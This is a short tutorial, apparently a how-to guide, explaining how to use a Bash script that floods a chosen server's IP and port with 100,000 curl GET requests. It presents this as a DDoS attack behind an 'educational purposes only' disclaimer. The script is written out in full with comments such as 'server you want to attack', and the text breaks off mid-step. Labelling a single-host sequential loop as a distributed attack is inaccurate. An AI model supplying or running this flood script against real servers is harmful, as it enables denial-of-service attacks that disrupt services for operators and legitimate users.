## Using the HTTP GET Request Flood Bash Script

**Disclaimer**: This guide is for educational purposes only. Unauthorized and malicious use of this script to flood requests to a server is illegal and unethical.

This guide explains how to use the provided Bash script to simulate an HTTP GET request flood. This type of activity, known as a Distributed Denial of Service (DDoS) attack, can overload a server and make it inaccessible to legitimate users.

# Prerequisites

- A Unix-like terminal (Linux or macOS)
- The curl command-line tool

# Steps

1. Access the Bash Script:

    Open a terminal on your system. You can find the terminal application in the "Applications" or "Utilities" folder.

2. Copy the Script:

    Copy the following Bash script and paste it into your terminal:

    ```bash
    #!/bin/bash

    IP_ADDRESS="127.0.0.1" # Change this to the IP address of the server you want to attack
    PORT=80 # Change this to the port number of the server you want to attack
    NUM_REQUESTS=100000 # Change this to the number of requests you want to send

    for ((i = 1; i <= $NUM_REQUESTS; i++)); do
        echo "Sending GET request $i to IP address $IP_ADDRESS"
        curl -sS "http://$IP_ADDRESS:$PORT" # -sS flag to hide the progress bar
        echo "Received response for request $i"
    done
    ```
3. Modify Script Parameters:

    Adjust the following variables in the script according to your testing environment:

    - IP_ADDRESS: Replace with the IP address of the server you want to target.
    - PORT: Replace with the port number of the server you want to target.
    - NUM_REQUESTS: Replace with the number of requests you want to send to the server.

4. Save the Script:

    Save the file with a .sh extension, such as http_flood.sh.

Make the Script Executable:

In your terminal, navigate to the directory containing the script and make it executable by running: